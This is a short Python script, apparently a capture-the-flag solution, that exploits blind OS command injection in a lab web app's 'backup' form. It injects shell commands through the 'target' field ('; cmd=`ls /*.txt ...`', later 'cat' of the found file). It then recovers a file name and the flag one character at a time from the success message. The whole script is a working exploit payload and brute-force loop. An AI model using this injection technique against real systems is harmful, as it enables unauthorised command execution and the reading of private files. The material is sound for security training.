import requests
#Format Flag.txt = /*_secret.txt
#Format Flag = CBJS{...}

charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}_/"
#Common String 

url="http://cmdi.cyberjutsu-lab.tech:3006/"
#url to brute-force

Flag_file =''
Flag =''

for i in range(1,20): # Loop 1->20 char ( if a result longer than 20, increase more )
    for c in charset:
        injection= 'aaaaaa --help ; cmd=`ls /*.txt | head -n 1 | cut -c {index}`; if [ $cmd = "{charset}" ]; then echo "conca"; else echo "zip error"; fi; #'.format(index=i,charset=c)
        #Create a payload to injection with shell script
        data = {
            'command': 'backup',
            'target': injection
            }
        response = requests.post(url, data=data)
        # Send payload to field 'target' to brute-force
        if "Backup thành công" in response.text:
            print("Tui đã tìm ra được kí tự thứ {index} trong file là : {charset}".format(index=i,charset=c))
            Flag_file += c
            # Combine char to a string 
            print(Flag_file)
# Continue brute-force result of flag based on file_name I just getted.
for i in range(1,50):
    for c in charset:
        injection = 'aaaaaa --help ; cmd=`cat ' + Flag_file + '.txt' + '  | head -n 1 | cut -c {index}`; if [ $cmd = "{charset}" ]; then echo "conca"; else echo "zip error"; fi; #'.format(index=i,charset=c)
        data = {
            'command': 'backup',
            'target': injection
            }
        response = requests.post(url, data=data)
        if "Backup thành công" in response.text:
            print("Tui đã tìm ra được kí tự thứ {index} trong flag là : {charset}".format(index=i,charset=c))
            Flag += c
            print(Flag)